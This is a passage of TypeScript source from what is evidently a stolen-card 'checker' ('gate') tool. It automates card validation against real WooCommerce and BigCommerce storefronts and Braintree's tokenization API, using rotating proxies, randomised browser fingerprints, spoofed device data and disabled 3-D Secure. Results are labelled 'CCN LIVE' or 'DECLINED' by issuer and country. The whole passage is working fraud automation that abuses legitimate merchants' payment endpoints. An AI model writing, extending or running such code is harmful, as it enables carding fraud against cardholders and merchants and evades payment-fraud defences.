        body: JSON.stringify({ address }),
        contentType: "application/json",
        referer: `${cleanSite}/checkout`,
        origin: cleanSite,
        accept: "application/json",
        extraHeaders: bcHeaders,
        timeout: 15000,
        maxRetries: 0,
      },
    );
    state = billResp.state;
    if (!billResp.ok) {
      dbg(`[bc-stencil] billing-address failed status=${billResp.status}`);
      return null;
    }

    // 6. Consignment / shipping — best-effort, BC defaults if this is skipped
    try {
      const physicalItems = JSON.parse(billResp.text)?.cart?.lineItems?.physicalItems || [];
      if (physicalItems.length > 0) {
        const consignBody = JSON.stringify([{
          address,
          lineItems: physicalItems.map((li: any) => ({ itemId: li.id, quantity: li.quantity })),
        }]);
        const consignResp = await sessionFetch(
          `${cleanSite}/api/storefront/checkouts/${checkoutId}/consignments?include=consignments.availableShippingOptions`,
          state,
          {
            method: "POST",
            body: consignBody,
            contentType: "application/json",
            referer: `${cleanSite}/checkout`,
            origin: cleanSite,
            accept: "application/json",
            extraHeaders: bcHeaders,
            timeout: 15000,
            maxRetries: 0,
          },
        );
        state = consignResp.state;
      }
    } catch (consignErr: any) {
      dbg(`[bc-stencil] consignment step skipped: ${consignErr.message}`);
    }

    // 7. Submit order → X-Checkout-Payment-Token (JWT) — header not exposed by
    // sessionFetch, so this step uses a raw fetch (mirrors tokenizeAtBraintree).
    let paymentJwt: string | null = null;
    try {
      const orderFetchOpts: any = {
        method: "POST",
        headers: {
          "User-Agent": ua,
          "Content-Type": "application/json",
          Accept: "application/json",
          Cookie: state.cookies,
          Referer: `${cleanSite}/checkout`,
          Origin: cleanSite,
          ...bcHeaders,
        },
        body: JSON.stringify({ checkoutId }),
        signal: AbortSignal.timeout(20000),
      };
      if (state.proxy) {
        const d = await getProxyDispatcher(state.proxy);
        if (d) orderFetchOpts.dispatcher = d;
      }
      const orderResp = await fetch(`${cleanSite}/internalapi/v1/checkout/order`, orderFetchOpts);
      const newCookies = parseCookies(orderResp.headers);
      state = { ...state, cookies: mergeCookies(state.cookies, newCookies) };
      paymentJwt = orderResp.headers.get("x-checkout-payment-token");
      if (!paymentJwt) {
        const orderText = await orderResp.text();
        const jwtM = orderText.match(/"paymentAccessToken":"([^"]+)"/);
        paymentJwt = jwtM?.[1] || null;
      }
    } catch (orderErr: any) {
      dbg(`[bc-stencil] order submit failed: ${orderErr.message}`);
    }
    if (!paymentJwt) {
      dbg("[bc-stencil] No payment JWT — cannot finalize order");
      return null;
    }

    // 8. Tokenize card at BT GraphQL
    const tok = await tokenizeAtBraintree(
      cardNumber, month, year, cvv, authFingerprint, ua, secChUa,
      { zip: bd.zip || "10001", line1: bd.line1 },
    );
    if (!tok.ok || !tok.token) {
      dbg(`[bc-stencil] Tokenize failed: ${tok.error}`);
      return {
        status: "dead",
        response: `DECLINED ✗ ${tok.error} | ${detectBrandFromBin(cardNumber)}`,
        code: "bt_tokenize_error",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const network     = (tok.brandCode || detectBrandFromBin(cardNumber)).toUpperCase();
    const issuer       = tok.issuingBank || "Unknown";
    const countryCode  = tok.countryOfIssuance || "??";
    const cardType     = tok.prepaid === "Yes" ? "PREPAID" : tok.debit === "Yes" ? "DEBIT" : "CREDIT";

    // 9. Submit payment to BigCommerce payments API
    const payFetchOpts: any = {
      method: "POST",
      headers: {
        "User-Agent": ua,
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Bearer ${paymentJwt}`,
        "X-Checkout-Payment-Token": paymentJwt,
      },
      body: JSON.stringify({
        payment: {
          instrument: { type: "tokenized_card", token: tok.token, tokenType: "braintree" },
        },
      }),
      signal: AbortSignal.timeout(20000),
    };
    if (state.proxy) {
      const d = await getProxyDispatcher(state.proxy);
      if (d) payFetchOpts.dispatcher = d;
    }
    const payResp = await fetch("https://payments.bigcommerce.com/api/public/v1/orders/payments", payFetchOpts);
    const payText = await payResp.text();
    dbg(`[bc-stencil] payment submit → status=${payResp.status}, len=${payText.length}`);

    // payments.bigcommerce.com returns JSON, not WC HTML — classifyBtJson
    // reads order.state/payment_state/processorResponseCode instead of
    // HTML-only markers like "Reason:" or <li> error text.
    return classifyBtJson(
      payText, gateName,
      network, cardType, countryCode, issuer,
      fullCardInfo, Date.now() - start,
    );
  } catch (err: any) {
    dbg(`[bc-stencil] Flow error: ${err.message}`);
    return null;
  }
}

// ─── Main Braintree gate checker ─────────────────────────────────────────────

export async function checkCardBraintree(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  clientToken: string,
  gateName: string,
  siteUrl?: string,
  extras?: BraintreeExtras,
): Promise<CheckResult> {
  const start = Date.now();
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;

  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 2) year = "20" + year;

  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;

  try {
    // ── Bad-token early guard ───────────────────────────────────────────────
    if (isBadBtToken(clientToken)) {
      return {
        status: "error",
        response: "Invalid BT client token (error message stored as token — update gate settings)",
        code: "invalid_token",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // Decode provided client token (used as baseline / fallback). Strict path
    // tells us *which* step failed so the operator knows what to fix.
    const strict = decodeBtTokenStrict(clientToken);
    if (!strict.ok) {
      const reason = ({
        empty: "client token is empty in gate settings",
        not_base64: "not a valid base64 string (was the token URL-encoded or escaped in transit?)",
        not_json: "base64 decodes to non-JSON bytes (token may be truncated or for a different scheme)",
        no_auth_fingerprint: "decoded JSON has no authorizationFingerprint (wrong key — looks like a Stripe/other token, not Braintree)",
      } as const)[strict.error];
      return {
        status: "error",
        response: `Invalid BT client token: ${reason}`,
        code: `invalid_token_${strict.error}`,
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }
    let { authFingerprint, merchantId } = strict;
    // Apply extras fallback for merchant ID
    if (!merchantId && extras?.btMerchantId) merchantId = extras.btMerchantId;

    const btFlow = extras?.btFlow || "";

    // ── WooCommerce / site flows ────────────────────────────────────────────
    if (siteUrl) {
      const cleanSite = siteUrl.replace(/\/+$/, "");
      let state: SessionState = {
        ua,
        secChUa,
        cookies: "",
        proxy: (await getProxy()) ?? undefined,
      };

      // ── bigcommerce_stencil: BC Stencil storefront + BT GQL ───────────────
      if (btFlow === "bigcommerce_stencil") {
        const bcResult = await checkBigCommerceStencilFlow(
          cardNumber, month, year, cvv, cleanSite,
          state, ua, secChUa, gateName, fullCardInfo, start,
        );
        if (bcResult) return bcResult;
        dbg("[braintree] bigcommerce_stencil flow returned null — falling back to token-only");
      }

      // ── wc_braintree: real WC checkout using Braintree as PM ─────────────
      if (btFlow === "wc_braintree") {
        const ckResult = await checkWcBraintreeCheckoutFlow(
          cardNumber, month, year, cvv, cleanSite,
          authFingerprint, merchantId,
          state, ua, secChUa, gateName, fullCardInfo, start,
        );
        if (ckResult) return ckResult;
        dbg("[braintree] wc_braintree checkout flow returned null — falling back to addpm");
      }

      // ── wc_braintree_addpm: WC add-payment-method vault (default) ────────
      try {
        const addPmPath = extras?.addPmPath || "/my-account/add-payment-method/";
        const addPmUrl = `${cleanSite}${addPmPath}`;
        const pageResp = await sessionFetch(addPmUrl, state, { timeout: 15000 });
        state = pageResp.state;
        const pageHtml = pageResp.text;

        // Always prefer a fresh token extracted from the live page
        const rawPageToken = extractBtClientToken(pageHtml);
        if (rawPageToken && !isBadBtToken(rawPageToken)) {
          const fresh = decodeBtToken(rawPageToken);
          if (fresh) {
            ({ authFingerprint, merchantId } = fresh);
            dbg(`[braintree] fresh token from addpm page — merchant=${merchantId || "?"}`);
          }
        }

        const addPmNonce = extractBetween(
          pageHtml,
          'name="woocommerce-add-payment-method-nonce" value="',
          '"'
        );

        if (addPmNonce) {
          // Tokenize card at BT GraphQL
          const tok = await tokenizeAtBraintree(
            cardNumber, month, year, cvv, authFingerprint, ua, secChUa
          );

          if (!tok.ok) {
            return {
              status: "dead",
              response: `DECLINED ✗ ${tok.error} | ${detectBrandFromBin(cardNumber)}`,
              code: "bt_tokenize_error",
              latency: Date.now() - start,
              gate: gateName,
              cardInfo: fullCardInfo,
            };
          }

          const network   = (tok.brandCode || detectBrandFromBin(cardNumber)).toUpperCase();
          const issuer    = tok.issuingBank || "Unknown";
          const countryCode = tok.countryOfIssuance || "??";
          const cardType  = tok.prepaid === "Yes" ? "PREPAID" : tok.debit === "Yes" ? "DEBIT" : "CREDIT";

          // Build braintree_cc_config_data (critical field)
          const configData = JSON.stringify({
            environment: "production",
            clientApiUrl: merchantId
              ? `https://api.braintreegateway.com:443/merchants/${merchantId}/client_api`
              : "",
            assetsUrl: "https://assets.braintreegateway.com",
            merchantId: merchantId,
            venmo: "off",
            graphQL: {
              url: "https://payments.braintree-api.com/graphql",
              features: ["tokenize_credit_cards"],
            },
            challenges: ["cvv"],
            threeDSecureEnabled: false,
            threeDSecure: null,
            paypalEnabled: false,
          });

          const deviceData = JSON.stringify({
            device_session_id: crypto.randomUUID().replace(/-/g, ""),
            fraud_merchant_id: null,
            correlation_id: crypto.randomUUID(),
          });

          // Try both WC BT plugin slug variants.
          // braintree_credit_card (SkyVerge / WooCommerce.com) is tried first;
          // braintree_cc (Kestrel) is the fallback. Both nonce-key field names
          // are sent so either plugin picks up the right one.
          const preState = { ...state };
          for (const pmSlug of ["braintree_credit_card", "braintree_cc"]) {
            state = { ...preState };

            const submitBody = new URLSearchParams({
              payment_method: pmSlug,
              braintree_cc_nonce_key: tok.token!,
              wc_braintree_credit_card_payment_nonce: tok.token!,
              braintree_cc_device_data: deviceData,
              braintree_cc_3ds_nonce_key: "",
              braintree_cc_config_data: configData,
              "woocommerce-add-payment-method-nonce": addPmNonce,
              _wp_http_referer: addPmPath,
              woocommerce_add_payment_method: "1",
            });

            const submitResp = await sessionFetch(addPmUrl, state, {
              method: "POST",
              body: submitBody.toString(),
              contentType: "application/x-www-form-urlencoded",
              referer: addPmUrl,
              origin: cleanSite,
              timeout: 30000,
            });
            state = submitResp.state;

            const result = classifyBtHtml(
              submitResp.text,
              gateName, network, cardType, countryCode, issuer,
              fullCardInfo, Date.now() - start,
            );

            if (result.code !== "bt_unknown") return result;
            dbg(`[braintree] slug ${pmSlug} → bt_unknown, trying next slug`);
          }

          // All slugs gave unknown — return generic decline
          return {
            status: "dead",
            response: `DECLINED ✗ Unknown BT Response | ${network} [${countryCode}]`,
            code: "bt_unknown",
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }

        // No addpm nonce — if we haven't already tried wc_braintree, try it as fallback
        if (btFlow !== "wc_braintree") {
          dbg("[braintree] No add-pm nonce — trying WC checkout as automatic fallback");
          const ckResult = await checkWcBraintreeCheckoutFlow(
            cardNumber, month, year, cvv, cleanSite,
            authFingerprint, merchantId,
            state, ua, secChUa, gateName, fullCardInfo, start,
          );
          if (ckResult) return ckResult;
        }

        dbg("[braintree] Site flow exhausted — falling back to token-only");
      } catch (siteErr: any) {
        dbg(`[braintree] Site WC flow failed: ${siteErr.message} — falling back to token-only`);
      }
    }

    // ── Token-only path (no siteUrl, or all site flows failed) ───────────
    const billing = await pickBilling(cardNumber);
    const tok = await tokenizeAtBraintree(
      cardNumber, month, year, cvv, authFingerprint, ua, secChUa, billing
    );

    if (!tok.ok) {
      const binBrand = detectBrandFromBin(cardNumber);
      return {
        status: "dead",
        response: `DECLINED ✗ ${tok.error} | ${binBrand}`,
        code: "bt_error",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const network   = (tok.brandCode || detectBrandFromBin(cardNumber)).toUpperCase();
    const issuer    = tok.issuingBank || "Unknown";
    const countryCode = tok.countryOfIssuance || "??";
    const cardType  = tok.prepaid === "Yes" ? "PREPAID" : tok.debit === "Yes" ? "DEBIT" : "CREDIT";

    return {
      status: "live",
      response: `CCN LIVE ✓ Tokenized | ${network} ${cardType} [${countryCode}] | ${issuer}`,
      code: "bt_tokenized",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  } catch (error: any) {
    return {
      status: "error",
      response: `BT Error: ${error.message}`,
      code: "network_error",
      latency: Date.now() - start,
      gate: gateName,
    };
  }
}
